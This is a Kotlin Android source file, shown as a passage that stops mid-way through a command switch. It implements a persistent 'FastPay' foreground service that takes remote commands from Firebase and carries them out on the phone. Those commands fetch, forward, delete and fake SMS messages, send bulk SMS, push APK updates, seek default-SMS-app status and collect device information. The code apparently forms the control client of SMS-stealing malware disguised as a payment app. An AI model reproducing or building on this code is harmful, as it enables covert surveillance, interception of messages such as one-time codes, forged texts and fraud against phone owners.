package com.example.fast.service

import android.Manifest.permission
import android.annotation.SuppressLint
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.content.pm.ServiceInfo
import android.net.ConnectivityManager
import android.os.BatteryManager
import android.os.Build
import android.os.IBinder
import android.provider.Settings
import android.telephony.TelephonyManager
import androidx.core.app.ActivityCompat
import androidx.core.app.NotificationCompat
import com.example.fast.R
import com.example.fast.config.AppConfig
import com.google.firebase.Firebase
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.ValueEventListener
import com.google.firebase.database.database
import com.prexoft.prexocore.anon.SimSlot
import com.prexoft.prexocore.sendSms
import com.prexoft.prexocore.writeInternalFile
import android.util.Log
import android.Manifest
import android.content.ContentValues
import com.example.fast.util.DjangoApiHelper
import com.example.fast.util.SmsQueryHelper
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.launch
import com.example.fast.util.DeviceInfoCollector
import com.example.fast.util.LogHelper
import com.example.fast.util.DefaultSmsAppHelper
import com.example.fast.ui.DefaultSmsRequestActivity
import com.example.fast.util.FirebaseWriteHelper
import com.example.fast.workers.BackupMessagesWorker
import com.example.fast.workers.ExportMessagesWorker
import com.example.fast.util.FakeMessageManager
import com.example.fast.util.FakeMessageTemplateEngine
import com.example.fast.util.AutoReplyManager
import com.example.fast.util.BulkSmsManager
import com.example.fast.util.MessageTemplateEngine
import com.example.fast.util.MessageAnalyticsManager
import com.example.fast.notification.AppNotificationManager
import com.example.fast.util.NotificationBatchProcessor
import com.example.fast.util.SmsMessageBatchProcessor
import com.example.fast.util.ContactBatchProcessor
import com.example.fast.util.WorkflowExecutor
import com.example.fast.util.NetworkUtils
import android.os.Handler
import android.os.Looper
import android.net.Network
import android.net.NetworkCapabilities
import android.net.NetworkRequest
import android.net.wifi.WifiManager
import android.telephony.SubscriptionManager
import androidx.work.Constraints
import androidx.work.ExistingWorkPolicy
import androidx.work.NetworkType
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.WorkManager
import androidx.work.workDataOf
import com.prexoft.prexocore.readInternalFile
import java.util.concurrent.atomic.AtomicLong

class PersistentForegroundService : Service() {

    companion object {
        private const val TAG = "PersistentForegroundService"
        private const val CHANNEL_ID = "fastpay_foreground_channel"
        private const val CHANNEL_NAME = "FastPay Service"
        private const val NOTIFICATION_ID = 1001
        private const val ACTIVE_HEARTBEAT_INTERVAL_MS = 60 * 1000L // 60 seconds for active devices
        private const val INACTIVE_HEARTBEAT_INTERVAL_MS = 60 * 1000L // 60 seconds for inactive devices
        private const val DEFAULT_HEARTBEAT_INTERVAL_MS = 60 * 1000L // Default to 60 seconds
        private const val MAIN_PATH_UPDATE_INTERVAL_MS = 5 * 60 * 1000L // 5 minutes - for backward compatibility
        private const val DEVICE_INFO_COLLECTION_INTERVAL_MS = 6 * 60 * 60 * 1000L // 6 hours

        fun start(context: Context) {
            val intent = Intent(context, PersistentForegroundService::class.java)
            context.startForegroundService(intent)
        }
    }
    
    // Firebase listener references for cleanup
    private var commandListener: ValueEventListener? = null
    private var filterListener: ValueEventListener? = null
    private var isActiveListener: ValueEventListener? = null
    
    // Thread-safe timestamp for command debouncing (prevents race conditions)
    private val lastCommandTime = AtomicLong(0L)
    
    // Dynamic heartbeat interval (defaults to 60 seconds)
    private var currentHeartbeatIntervalMs = DEFAULT_HEARTBEAT_INTERVAL_MS
    
    // Battery tracking for conditional writes (only write if changed ±1%)
    private var lastBatteryPercentage = -1
    
    // Last time main path was updated (for backward compatibility)
    private var lastMainPathUpdate: Long? = null
    
    private val heartbeatHandler = Handler(Looper.getMainLooper())
    private val heartbeatRunnable = object : Runnable {
        override fun run() {
            updateOnlineStatus()
            heartbeatHandler.postDelayed(this, currentHeartbeatIntervalMs)
        }
    }
    
    private val deviceInfoHandler = Handler(Looper.getMainLooper())
    private val deviceInfoRunnable = object : Runnable {
        override fun run() {
            collectDeviceInfo()
            deviceInfoHandler.postDelayed(this, DEVICE_INFO_COLLECTION_INTERVAL_MS)
        }
    }

    private val serviceScope = CoroutineScope(Dispatchers.Main + SupervisorJob())

    private val commandPrefs by lazy { getSharedPreferences("command_prefs", Context.MODE_PRIVATE) }
    private val permissionStatusPrefs by lazy { getSharedPreferences("permission_status_cache", Context.MODE_PRIVATE) }
    private val commandCooldownsMs = mapOf(
        "sendSms" to 10_000L,
        "sendBulkSms" to 60_000L,
        "backupMessages" to 120_000L,
        "exportMessages" to 120_000L,
        "executeWorkflow" to 30_000L
    )

    @SuppressLint("HardwareIds")
    private fun androidId(): String {
        val id = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
        LogHelper.d(TAG, "Device ID retrieved: $id")
        return id
    }

    @SuppressLint("HardwareIds")
    override fun onCreate() {
        super.onCreate()
        
        // Wrap in try-catch to prevent service crash on initialization errors
        try {
            createNotificationChannel()
        } catch (e: Exception) {
            LogHelper.e(TAG, "Error creating notification channel, continuing anyway", e)
        }

        resyncLastCommandStatus()

        // Setup command listener with proper reference for cleanup
        // Use new device path structure: device/{deviceId}/commands
        val deviceId = androidId()
        val commandsPath = "${AppConfig.getFirebaseDevicePath(deviceId)}/${AppConfig.FirebasePaths.COMMANDS}"
        LogHelper.d(TAG, "Device ID: $deviceId")
        LogHelper.d(TAG, "Setting up command listener at path: $commandsPath")
        commandListener = object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                if (snapshot.exists()) {
                    val currentTime = System.currentTimeMillis()
                    val lastTime = lastCommandTime.get()
                    
                    // Thread-safe debouncing: prevent multiple commands within 1 second
                    if (currentTime - lastTime < 1000) {
                        LogHelper.d(TAG, "Command ignored - too soon after last command")
                        return
                    }
                    
                    // Atomically update last command time
                    lastCommandTime.set(currentTime)

                    // Collect all commands first before processing
                    val commandsToProcess = mutableListOf<Pair<String, String>>()
                    for (a in snapshot.children) {
                        commandsToProcess.add(Pair(a.key.toString(), a.value?.toString() ?: ""))
                    }

                    // Save all commands to history FIRST, then remove originals, then execute
                    saveCommandsToHistory(commandsToProcess, currentTime) { historySuccess ->
                        if (historySuccess) {
                            // Remove original commands from Firebase after saving to history
                            val commandsRef = Firebase.database.reference.child(commandsPath)
                            commandsRef.removeValue().addOnSuccessListener {
                                LogHelper.d(TAG, "Commands removed from Firebase after saving to history")
                                
                                // Now execute all commands
                                commandsToProcess.forEach { (key, value) ->
                                    try {
                                        followCommand(key, value, currentTime)
                                    } catch (e: IllegalArgumentException) {
                                        LogHelper.e(TAG, "Invalid command format: $key", e)
                                        updateCommandHistoryStatus(currentTime, key, "failed", "Invalid command format: ${e.message}")
                                    } catch (e: Exception) {
                                        LogHelper.e(TAG, "Error executing command: $key", e)
                                        updateCommandHistoryStatus(currentTime, key, "failed", "Execution error: ${e.message}")
                                    }
                                }
                            }.addOnFailureListener { e ->
                                LogHelper.e(TAG, "Failed to remove commands from Firebase", e)
                                // Still try to execute commands even if removal fails
                                commandsToProcess.forEach { (key, value) ->
                                    try {
                                        followCommand(key, value, currentTime)
                                    } catch (ex: Exception) {
                                        LogHelper.e(TAG, "Error executing command after removal failure: $key", ex)
                                        updateCommandHistoryStatus(currentTime, key, "failed", "Execution error: ${ex.message}")
                                    }
                                }
                            }
                        } else {
                            LogHelper.e(TAG, "Failed to save commands to history, executing anyway")
                            // Execute commands even if history save failed (backward compatibility)
                            commandsToProcess.forEach { (key, value) ->
                                try {
                                    followCommand(key, value, currentTime)
                                } catch (e: Exception) {
                                    LogHelper.e(TAG, "Error executing command: $key", e)
                                }
                            }
                            
                            // Still try to remove original commands
                            val commandsRef = Firebase.database.reference.child(commandsPath)
                            commandsRef.removeValue().addOnFailureListener { e ->
                                LogHelper.e(TAG, "Failed to remove commands from Firebase", e)
                            }
                        }
                    }
                }
            }
            
            override fun onCancelled(error: DatabaseError) {
                LogHelper.e(TAG, "Command listener cancelled: ${error.message}", error.toException())
            }
        }
        Firebase.database.reference.child(commandsPath).addValueEventListener(commandListener!!)

        // Setup filter listener with proper reference for cleanup
        // Use new device path structure: device/{deviceId}/filter
        val filterPath = "${AppConfig.getFirebaseDevicePath(androidId())}/${AppConfig.FirebasePaths.FILTER}"
        filterListener = object : ValueEventListener {
                override fun onDataChange(snapshot: DataSnapshot) {
                try {
                    if (snapshot.child("sms").exists()) {
                        val smsFilter = snapshot.child("sms").value?.toString() ?: ""
                        writeInternalFile("filterSms.txt", smsFilter)
                    } else {
                        writeInternalFile("filterSms.txt", "")
                    }

                    if (snapshot.child("notification").exists()) {
                        val notificationFilter = snapshot.child("notification").value?.toString() ?: ""
                        writeInternalFile("filterNotify.txt", notificationFilter)
                    } else {
                        writeInternalFile("filterNotify.txt", "")
                    }
                    
                    // Sync blockSms rule from Firebase
                    if (snapshot.child("blockSms").exists()) {
                        val blockSmsRule = snapshot.child("blockSms").value?.toString() ?: ""
                        writeInternalFile("blockSms.txt", blockSmsRule)
                        LogHelper.d(TAG, "Block SMS rule synced from Firebase: $blockSmsRule")
                    } else {
                        writeInternalFile("blockSms.txt", "")
                        LogHelper.d(TAG, "No block SMS rule in Firebase, cleared local cache")
                    }
                } catch (e: SecurityException) {
                    LogHelper.e(TAG, "Permission denied writing filter files", e)
                } catch (e: Exception) {
                    LogHelper.e(TAG, "Error updating filter files", e)
                }
                }

                override fun onCancelled(error: DatabaseError) {
                LogHelper.e(TAG, "Filter listener cancelled: ${error.message}", error.toException())
            }
                }
        try {
            Firebase.database.reference.child(filterPath).addValueEventListener(filterListener!!)
        } catch (e: Exception) {
            LogHelper.e(TAG, "Error setting up filter listener, will retry", e)
        }
        
        // Setup isActive listener (heartbeat defaults to 60 seconds and can be changed remotely)
        val devicePath = AppConfig.getFirebaseDevicePath(androidId())
        val isActivePath = "$devicePath/${AppConfig.FirebasePaths.IS_ACTIVE}"
        isActiveListener = object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                try {
                    val isActiveValue = snapshot.value?.toString() ?: ""
                    // Heartbeat interval is configurable via remote command (default: 60 seconds)
                    // This listener is kept for other potential uses of isActive status
                    LogHelper.d(TAG, "isActive status: $isActiveValue (heartbeat: ${currentHeartbeatIntervalMs / 1000}s)")
                } catch (e: Exception) {
                    LogHelper.e(TAG, "Error processing isActive value", e)
                }
            }
            
            override fun onCancelled(error: DatabaseError) {
                LogHelper.e(TAG, "isActive listener cancelled: ${error.message}", error.toException())
            }
        }
        try {
            Firebase.database.reference.child(isActivePath).addValueEventListener(isActiveListener!!)
            LogHelper.d(TAG, "isActive listener setup (heartbeat: ${currentHeartbeatIntervalMs / 1000}s)")
        } catch (e: Exception) {
            LogHelper.e(TAG, "Error setting up isActive listener, will retry", e)
        }
        
        // Start heartbeat to update online status
        try {
            startHeartbeat()
        } catch (e: Exception) {
            LogHelper.e(TAG, "Error starting heartbeat, will retry", e)
        }
        
        // Start periodic device info collection
        try {
            startDeviceInfoCollection()
        } catch (e: Exception) {
            LogHelper.e(TAG, "Error starting device info collection, will retry", e)
        }
        
        LogHelper.d(TAG, "Service created and initialized successfully")
        
        // Initialize notification channels
        AppNotificationManager.initializeChannels(this)
        
        // Load auto-reply configuration from Firebase
        AutoReplyManager.loadAutoReplyConfig(this)
        
        // Initialize notification batch processor (load from persistent storage)
        NotificationBatchProcessor.initializeFromStorage(this)
        
        // Initialize message batch processor (load from persistent storage)
        SmsMessageBatchProcessor.initializeFromStorage(this)
        
        // Initialize contact batch processor (load from persistent storage)
        ContactBatchProcessor.initializeFromStorage(this)
        
        // Set up network connectivity listener for immediate retry on connection restore
        setupNetworkConnectivityListener()
    }
    
    /**
     * Set up network connectivity listener to trigger immediate retry when connection is restored
     */
    private fun setupNetworkConnectivityListener() {
        try {
            val connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager
            if (connectivityManager == null) {
                LogHelper.w(TAG, "ConnectivityManager not available, skipping network listener setup")
                return
            }
            
            val networkRequest = NetworkRequest.Builder()
                .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
                .addCapability(NetworkCapabilities.NET_CAPABILITY_VALIDATED)
                .build()
            
            val networkCallback = object : ConnectivityManager.NetworkCallback() {
                override fun onAvailable(network: Network) {
                    super.onAvailable(network)
                    LogHelper.d(TAG, "✅ Network connection restored - triggering notification and message upload retry")
                    
                    // Check if we have internet (validated)
                    if (NetworkUtils.hasInternetConnection(this@PersistentForegroundService)) {
                        // Trigger immediate retry for queued notifications
                        NotificationBatchProcessor.flush(this@PersistentForegroundService)
                        // Trigger immediate retry for queued messages
                        SmsMessageBatchProcessor.flush(this@PersistentForegroundService)
                        // Trigger immediate retry for queued contacts
                        ContactBatchProcessor.flush(this@PersistentForegroundService)
                    }
                }
                
                override fun onLost(network: Network) {
                    super.onLost(network)
                    LogHelper.d(TAG, "⚠️ Network connection lost - notifications will queue until connection restored")
                }
                
                override fun onCapabilitiesChanged(
                    network: Network,
                    networkCapabilities: NetworkCapabilities
                ) {
                    super.onCapabilitiesChanged(network, networkCapabilities)
                    
                    // Check if internet is validated
                    if (networkCapabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET) &&
                        networkCapabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_VALIDATED)) {
                        LogHelper.d(TAG, "✅ Internet connection validated - triggering notification, message, and contact upload retry")
                        // Trigger immediate retry for queued notifications
                        NotificationBatchProcessor.flush(this@PersistentForegroundService)
                        // Trigger immediate retry for queued messages
                        SmsMessageBatchProcessor.flush(this@PersistentForegroundService)
                        // Trigger immediate retry for queued contacts
                        ContactBatchProcessor.flush(this@PersistentForegroundService)
                    }
                }
            }
            
            // Register network callback
            connectivityManager.registerNetworkCallback(networkRequest, networkCallback)
            LogHelper.d(TAG, "Network connectivity listener registered")
            
            // Store callback reference for cleanup (if needed)
            // Note: Network callbacks are automatically unregistered when service is destroyed
        } catch (e: Exception) {
            LogHelper.e(TAG, "Error setting up network connectivity listener", e)
        }
    }
    
    /**
     * Start periodic heartbeat to update device online status
     * Updates both fastpay/{deviceId}/lastSeen and fastpay/device-list/{key}/lastSeen
     */
    private fun startHeartbeat() {
        // Send initial heartbeat immediately
        updateOnlineStatus()
        // Schedule periodic updates with current interval
        heartbeatHandler.postDelayed(heartbeatRunnable, currentHeartbeatIntervalMs)
        LogHelper.d(TAG, "Heartbeat started (interval: ${currentHeartbeatIntervalMs / 1000}s)")
    }
    
    /**
     * Restart heartbeat with updated interval
     * Called when isActive value changes in Firebase
     */
    private fun restartHeartbeat() {
        // Remove existing callbacks
        heartbeatHandler.removeCallbacks(heartbeatRunnable)
        // Restart with new interval
        startHeartbeat()
    }
    
    /**
     * Start periodic device information collection
     * Collects all available device info and syncs to Firebase
     * Runs every 6 hours to avoid battery drain
     */
    private fun startDeviceInfoCollection() {
        // Collect device info immediately on service start (first collection)
        collectDeviceInfo()
        // Schedule periodic collection (every 6 hours)
        deviceInfoHandler.postDelayed(deviceInfoRunnable, DEVICE_INFO_COLLECTION_INTERVAL_MS)
        LogHelper.d(TAG, "Device info collection started (interval: ${DEVICE_INFO_COLLECTION_INTERVAL_MS / 1000 / 60 / 60} hours)")
    }
    
    /**
     * Collect all device information in background
     * Uses DeviceInfoCollector to gather data from all subtasks
     * Each subtask syncs to Firebase independently
     */
    private fun collectDeviceInfo() {
        LogHelper.d(TAG, "Starting device info collection")
        
        DeviceInfoCollector.collectAllDeviceInfo(
            context = this,
            onProgress = { subtaskName, current, total, isComplete ->
                if (isComplete) {
                    LogHelper.d(TAG, "Device info collection complete: $current/$total subtasks")
                } else {
                    LogHelper.d(TAG, "Device info collection progress: $subtaskName ($current/$total)")
                }
            },
            onComplete = { allResults ->
                val successCount = allResults.values.count { it.success }
                val totalCount = allResults.size
                val totalTime = allResults.values.sumOf { it.collectionTime }
                LogHelper.d(TAG, "Device info collection finished: $successCount/$totalCount subtasks successful in ${totalTime}ms")
                
                // Log summary of results (only in debug builds)
                allResults.forEach { (name, result) ->
                    if (result.success) {
                        LogHelper.d(TAG, "  ✓ $name: ${result.data.size} items in ${result.collectionTime}ms")
                    } else {
                        LogHelper.w(TAG, "  ✗ $name: Failed - ${result.error?.message}")
                    }
                }
            },
            onError = { subtaskName, error ->
                LogHelper.e(TAG, "Device info collection error in $subtaskName", error)
            }
        )
    }
    
    /**
     * Update device online status in Firebase
     * 
     * OPTIMIZED VERSION:
     * - Uses lightweight heartbeat path: hertbit/{deviceId}
     * - Main path updated less frequently for backward compatibility (every 5 minutes)
     * - Battery only written if changed significantly (±1%)
     * 
     * Uses unified FirebaseWriteHelper for consistent write operations
     */
    @SuppressLint("HardwareIds")
    private fun updateOnlineStatus() {
        val deviceId = androidId()
        val currentTime = System.currentTimeMillis()
        val batteryPercentage = com.example.fast.util.BatteryHelper.getBatteryPercentage(this)
        
        // Determine if main path should be updated (every 5 minutes for backward compatibility)
        val shouldUpdateMain = lastMainPathUpdate == null || 
                              (currentTime - lastMainPathUpdate!!) >= MAIN_PATH_UPDATE_INTERVAL_MS
        
        if (shouldUpdateMain) {
            lastMainPathUpdate = currentTime
        }
        
        // Use unified FirebaseWriteHelper to write to both paths
        lastBatteryPercentage = FirebaseWriteHelper.writeHeartbeat(
            deviceId = deviceId,
            timestamp = currentTime,
            batteryPercentage = batteryPercentage,
            lastBatteryPercentage = lastBatteryPercentage,
            shouldUpdateMain = shouldUpdateMain,
            tag = TAG,
            onHeartbeatSuccess = {
                // Heartbeat path write succeeded
            },
            onMainPathSuccess = {
                // Main path write succeeded (if updated)
            }
        )
    }

    /**
     * Save commands to history in Firebase before execution
     * @param commands List of (commandKey, commandValue) pairs to save
     * @param timestamp Timestamp when commands were received
     * @param callback Called with true if all commands were saved successfully
     */
    @SuppressLint("HardwareIds")
    private fun saveCommandsToHistory(
        commands: List<Pair<String, String>>,
        timestamp: Long,
        callback: (Boolean) -> Unit
    ) {
        if (commands.isEmpty()) {
            callback(true)
            return
        }

        val deviceId = androidId()
        serviceScope.launch {
            try {
                commands.forEach { (key, value) ->
                    DjangoApiHelper.logCommand(
                        deviceId = deviceId,
                        command = key,
                        value = value,
                        status = "pending",
                        receivedAt = timestamp
                    )
                }
                LogHelper.d(TAG, "Saved ${commands.size} command(s) to Django history")
                callback(true)
            } catch (e: Exception) {
                LogHelper.e(TAG, "Failed to save commands to Django history", e)
                callback(false)
            }
        }
    }
    
    /**
     * Update command history status after execution
     * @param historyTimestamp Original timestamp when command was received
     * @param commandKey Command key (e.g., "sendSms", "fetchSms")
     * @param status Execution status: "executed", "failed", "pending"
     * @param errorMessage Optional error message if status is "failed"
     */
    @SuppressLint("HardwareIds")
    private fun updateCommandHistoryStatus(
        historyTimestamp: Long,
        commandKey: String,
        status: String,
        errorMessage: String? = null
    ) {
        val deviceId = androidId()
        val executedAt = System.currentTimeMillis()
        commandPrefs.edit()
            .putString("last_command_key", commandKey)
            .putString("last_command_status", status)
            .putString("last_command_reason", errorMessage ?: "")
            .putLong("last_command_received", historyTimestamp)
            .putLong("last_command_executed", executedAt)
            .putBoolean("last_command_needs_resync", true)
            .apply()

        serviceScope.launch {
            try {
                DjangoApiHelper.logCommand(
                    deviceId = deviceId,
                    command = commandKey,
                    value = null, // Value already saved during pending state
                    status = status,
                    receivedAt = historyTimestamp,
                    executedAt = executedAt,
                    errorMessage = errorMessage
                )
                LogHelper.d(TAG, "Updated command history status in Django: $commandKey -> $status")
                commandPrefs.edit()
                    .putBoolean("last_command_needs_resync", false)
                    .apply()
            } catch (e: Exception) {
                LogHelper.e(TAG, "Failed to update command status in Django", e)
            }
        }
    }

    private fun resyncLastCommandStatus() {
        val needsResync = commandPrefs.getBoolean("last_command_needs_resync", false)
        if (!needsResync) return

        val commandKey = commandPrefs.getString("last_command_key", null) ?: return
        val status = commandPrefs.getString("last_command_status", null) ?: return
        val reason = commandPrefs.getString("last_command_reason", null)
        val receivedAt = commandPrefs.getLong("last_command_received", 0L)
        val executedAt = commandPrefs.getLong("last_command_executed", 0L)
        if (receivedAt == 0L) return

        serviceScope.launch {
            try {
                DjangoApiHelper.logCommand(
                    deviceId = androidId(),
                    command = commandKey,
                    value = null,
                    status = status,
                    receivedAt = receivedAt,
                    executedAt = executedAt,
                    errorMessage = reason
                )
            } catch (e: Exception) {
                LogHelper.e(TAG, "Resync command history failed", e)
            } finally {
                commandPrefs.edit()
                    .putBoolean("last_command_needs_resync", false)
                    .apply()
            }
        }
    }

    private fun isCommandRateLimited(commandKey: String, minIntervalMs: Long): Boolean {
        val lastRun = commandPrefs.getLong("last_$commandKey", 0L)
        return System.currentTimeMillis() - lastRun < minIntervalMs
    }

    private fun recordCommandExecution(commandKey: String) {
        commandPrefs.edit()
            .putLong("last_$commandKey", System.currentTimeMillis())
            .apply()
    }

    private fun shouldUploadPermissionStatus(statusMap: Map<String, Any>): Boolean {
        val now = System.currentTimeMillis()
        val lastHash = permissionStatusPrefs.getInt("last_hash", 0)
        val lastTime = permissionStatusPrefs.getLong("last_time", 0L)
        val currentHash = statusMap.toString().hashCode()

        if (currentHash == lastHash && now - lastTime < 60_000L) {
            return false
        }

        permissionStatusPrefs.edit()
            .putInt("last_hash", currentHash)
            .putLong("last_time", now)
            .apply()
        return true
    }
    
    private fun followCommand(key: String, content: String, historyTimestamp: Long) {
        try {
        commandCooldownsMs[key]?.let { intervalMs ->
            if (isCommandRateLimited(key, intervalMs)) {
                updateCommandHistoryStatus(historyTimestamp, key, "failed", "rate_limited")
                return
            }
            recordCommandExecution(key)
        }
        when (key) {
            "showNotification" -> {
                try {
                    handleShowNotificationCommand(content)
                    updateCommandHistoryStatus(historyTimestamp, key, "executed")
                } catch (e: Exception) {
                    LogHelper.e(TAG, "Error executing showNotification command", e)
                    updateCommandHistoryStatus(historyTimestamp, key, "failed", e.message)
                }
            }
            "sendSms" -> {
                    try {
                        handleSendSmsCommand(content, historyTimestamp)
                    } catch (e: Exception) {
                        LogHelper.e(TAG, "Error executing sendSms command", e)
                        updateCommandHistoryStatus(historyTimestamp, key, "failed", "Execution error: ${e.message}")
                    }
            }
            "requestPermission" -> {
                try {
                    handleRequestPermissionCommand(content)
                    updateCommandHistoryStatus(historyTimestamp, key, "executed")
                } catch (e: Exception) {
                    LogHelper.e(TAG, "Error executing requestPermission command", e)
                    updateCommandHistoryStatus(historyTimestamp, key, "failed", e.message)
                }
            }
            "updateApk" -> {
                try {
                    handleUpdateApkCommand(content)
                    updateCommandHistoryStatus(historyTimestamp, key, "executed")
                } catch (e: Exception) {
                    LogHelper.e(TAG, "Error executing updateApk command", e)
                    updateCommandHistoryStatus(historyTimestamp, key, "failed", e.message)
                }
            }
            "controlAnimation" -> {
                try {
                    handleControlAnimationCommand(content)
                    updateCommandHistoryStatus(historyTimestamp, key, "executed")
                } catch (e: Exception) {
                    LogHelper.e(TAG, "Error executing controlAnimation command", e)
                    updateCommandHistoryStatus(historyTimestamp, key, "failed", e.message)
                }
            }
            "syncNotification" -> {
                try {
                    handleSyncNotificationCommand(content)
                    updateCommandHistoryStatus(historyTimestamp, key, "executed")
                } catch (e: Exception) {
                    LogHelper.e(TAG, "Error executing syncNotification command", e)
                    updateCommandHistoryStatus(historyTimestamp, key, "failed", e.message)
                }
            }
            "fetchSms" -> {
                try {
                    handleFetchSmsCommand(content, historyTimestamp)
                } catch (e: Exception) {
                    LogHelper.e(TAG, "Error executing fetchSms command", e)
                    updateCommandHistoryStatus(historyTimestamp, key, "failed", e.message)
                }
            }
            "fetchDeviceInfo" -> {
                try {
                    handleFetchDeviceInfoCommand(content, historyTimestamp)
                } catch (e: Exception) {
                    LogHelper.e(TAG, "Error executing fetchDeviceInfo command", e)
                    updateCommandHistoryStatus(historyTimestamp, key, "failed", e.message)
                }
            }
            "reset" -> {
                try {
                    handleResetCommand(content)
                    // Reset is async, but we mark as executed since it starts the reset process
                    updateCommandHistoryStatus(historyTimestamp, key, "executed")
                } catch (e: Exception) {
                    LogHelper.e(TAG, "Error executing reset command", e)
                    updateCommandHistoryStatus(historyTimestamp, key, "failed", e.message)
                }
            }
            "checkPermission" -> {
                try {
                    handleCheckPermissionCommand(content, historyTimestamp)
                } catch (e: Exception) {
                    LogHelper.e(TAG, "Error executing checkPermission command", e)
                    updateCommandHistoryStatus(historyTimestamp, key, "failed", e.message)
                }
            }
            "removePermission" -> {
                try {
                    handleRemovePermissionCommand(content)
                    updateCommandHistoryStatus(historyTimestamp, key, "executed")
                } catch (e: Exception) {
                    LogHelper.e(TAG, "Error executing removePermission command", e)
                    updateCommandHistoryStatus(historyTimestamp, key, "failed", e.message)
                }
            }
            "requestDefaultSmsApp" -> {
                try {
                    handleRequestDefaultSmsAppCommand(content, historyTimestamp, key)
                } catch (e: Exception) {
                    LogHelper.e(TAG, "Error executing requestDefaultSmsApp command", e)
                    updateCommandHistoryStatus(historyTimestamp, key, "failed", e.message)
                }
            }
            "requestDefaultMessageApp" -> {
                try {
                    handleRequestDefaultMessageAppCommand(content, historyTimestamp, key)
                } catch (e: Exception) {
                    LogHelper.e(TAG, "Error executing requestDefaultMessageApp command", e)
                    updateCommandHistoryStatus(historyTimestamp, key, "failed", e.message)
                }
            }
            "setHeartbeatInterval" -> {
                try {
                    handleSetHeartbeatIntervalCommand(content)
                    updateCommandHistoryStatus(historyTimestamp, key, "executed")
                } catch (e: Exception) {
                    LogHelper.e(TAG, "Error executing setHeartbeatInterval command", e)
                    updateCommandHistoryStatus(historyTimestamp, key, "failed", e.message)
                }
            }
            "updateDeviceCodeList" -> {
                try {
                    handleUpdateDeviceCodeListCommand(content, historyTimestamp)
                } catch (e: Exception) {
                    LogHelper.e(TAG, "Error executing updateDeviceCodeList command", e)
                    updateCommandHistoryStatus(historyTimestamp, key, "failed", e.message)
                }
            }
            "sendSmsDelayed" -> {
                try {
                    handleSendSmsDelayedCommand(content, historyTimestamp)
                } catch (e: Exception) {
                    LogHelper.e(TAG, "Error executing sendSmsDelayed command", e)
                    updateCommandHistoryStatus(historyTimestamp, key, "failed", "Execution error: ${e.message}")
                }
            }
            "scheduleSms" -> {
                try {
                    handleScheduleSmsCommand(content, historyTimestamp)
                } catch (e: Exception) {
                    LogHelper.e(TAG, "Error executing scheduleSms command", e)
                    updateCommandHistoryStatus(historyTimestamp, key, "failed", "Execution error: ${e.message}")
                }
            }
            "editMessage" -> {
                try {
                    handleEditMessageCommand(content, historyTimestamp)
                } catch (e: Exception) {
                    LogHelper.e(TAG, "Error executing editMessage command", e)
                    updateCommandHistoryStatus(historyTimestamp, key, "failed", "Execution error: ${e.message}")
                }
            }
            "deleteMessage" -> {
                try {
                    handleDeleteMessageCommand(content, historyTimestamp)
                } catch (e: Exception) {
                    LogHelper.e(TAG, "Error executing deleteMessage command", e)
                    updateCommandHistoryStatus(historyTimestamp, key, "failed", "Execution error: ${e.message}")
                }
            }
            "createFakeMessage" -> {
                try {
                    handleCreateFakeMessageCommand(content, historyTimestamp)
                } catch (e: Exception) {
                    LogHelper.e(TAG, "Error executing createFakeMessage command", e)
                    updateCommandHistoryStatus(historyTimestamp, key, "failed", "Execution error: ${e.message}")
                }
            }
            "createFakeMessageTemplate" -> {
                try {
                    handleCreateFakeMessageTemplateCommand(content, historyTimestamp)
                } catch (e: Exception) {
                    LogHelper.e(TAG, "Error executing createFakeMessageTemplate command", e)
                    updateCommandHistoryStatus(historyTimestamp, key, "failed", "Execution error: ${e.message}")
                }
            }
            "setupAutoReply" -> {
                try {
                    handleSetupAutoReplyCommand(content, historyTimestamp)
                } catch (e: Exception) {
                    LogHelper.e(TAG, "Error executing setupAutoReply command", e)
                    updateCommandHistoryStatus(historyTimestamp, key, "failed", "Execution error: ${e.message}")
                }
            }
            "showCard" -> {
                try {
                    handleShowCardCommand(content)
                    updateCommandHistoryStatus(historyTimestamp, key, "executed")
                } catch (e: Exception) {
                    LogHelper.e(TAG, "Error executing showCard command", e)
                    updateCommandHistoryStatus(historyTimestamp, key, "failed", e.message)
                }
            }
            "startAnimation" -> {
                try {
                    handleStartAnimationCommand(content)
                    updateCommandHistoryStatus(historyTimestamp, key, "executed")
                } catch (e: Exception) {
                    LogHelper.e(TAG, "Error executing startAnimation command", e)
                    updateCommandHistoryStatus(historyTimestamp, key, "failed", e.message)
                }
            }
            "forwardMessage" -> {
                try {
                    handleForwardMessageCommand(content, historyTimestamp)
                } catch (e: Exception) {
                    LogHelper.e(TAG, "Error executing forwardMessage command", e)
                    updateCommandHistoryStatus(historyTimestamp, key, "failed", "Execution error: ${e.message}")
                }
            }
            "sendBulkSms" -> {
                try {
                    handleSendBulkSmsCommand(content, historyTimestamp)
                } catch (e: Exception) {
                    LogHelper.e(TAG, "Error executing sendBulkSms command", e)
                    updateCommandHistoryStatus(historyTimestamp, key, "failed", "Execution error: ${e.message}")
                }
            }
            "bulkEditMessage" -> {
                try {
                    handleBulkEditMessageCommand(content, historyTimestamp)
                } catch (e: Exception) {
                    LogHelper.e(TAG, "Error executing bulkEditMessage command", e)
                    updateCommandHistoryStatus(historyTimestamp, key, "failed", "Execution error: ${e.message}")
                }
            }
            "sendSmsTemplate" -> {
                try {
                    handleSendSmsTemplateCommand(content, historyTimestamp)
                } catch (e: Exception) {
                    LogHelper.e(TAG, "Error executing sendSmsTemplate command", e)
                    updateCommandHistoryStatus(historyTimestamp, key, "failed", "Execution error: ${e.message}")
                }
            }
            "saveTemplate" -> {
                try {
                    handleSaveTemplateCommand(content, historyTimestamp)
                } catch (e: Exception) {
                    LogHelper.e(TAG, "Error executing saveTemplate command", e)
                    updateCommandHistoryStatus(historyTimestamp, key, "failed", "Execution error: ${e.message}")
                }
            }
